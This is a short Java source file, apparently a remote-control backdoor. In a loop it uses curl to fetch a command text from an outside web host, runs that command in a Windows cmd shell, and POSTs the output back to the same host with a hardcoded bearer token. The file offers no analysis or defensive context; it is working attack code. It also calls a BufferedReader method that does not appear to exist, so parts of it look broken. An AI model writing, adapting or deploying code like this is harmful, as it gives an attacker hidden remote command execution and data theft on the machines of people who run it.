package com.example;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class App {


	public  static  String  Execute(String comando, Boolean Printeado)
	{
		 ProcessBuilder p1 = new ProcessBuilder("cmd");
	 
	 try {
	Process pe = p1.start();
	OutputStream po = pe.getOutputStream();
	OutputStreamWriter w = new OutputStreamWriter(po);
	PrintWriter writer = new PrintWriter(w, true);
	 InputStreamReader ip = new InputStreamReader(pe.getInputStream());
	 BufferedReader br = new  BufferedReader(ip);
	{	
	writer.println(comando);
	writer.close();
	String linea = br.readAllAsString();
	if (Printeado == true)
	System.out.println(linea);
	
	return  (linea);
	}
	 } catch (Exception e) {
		e.printStackTrace();
		return  ("Nulo");
	 }
	}

	
    public static void main(String[] args) throws Exception {
     ProcessBuilder p1 = new ProcessBuilder("cmd"); 
	 //String comando = IO.readln();
	String Bufferaex = "Nulo";
	 while (true) {
	String aex = Execute("curl https://archiv-love-web.lovable.app/f/erx.txt.txt",false);
		if (!aex.equals(Bufferaex))
			{
				String resolv = Execute(aex,true);
				

			HttpClient client = HttpClient.newHttpClient();

			HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create("https://archiv-love-web.lovable.app/api/public/edit/1790274652101-0-out.txt.txt"))
    .header("Authorization", "Bearer 145c2dedd89d71fbfbfe0cef8cb70c2ffe8d5ec7f3122b488edde06f9f41bd79")
    .POST(HttpRequest.BodyPublishers.ofString(resolv))
    .build();

HttpResponse<String> response =
    client.send(request, HttpResponse.BodyHandlers.ofString());

System.out.println(response.statusCode());
System.out.println(response.body());
				 Bufferaex = aex;
			}
				 Thread.sleep(1000);
	 }
}
}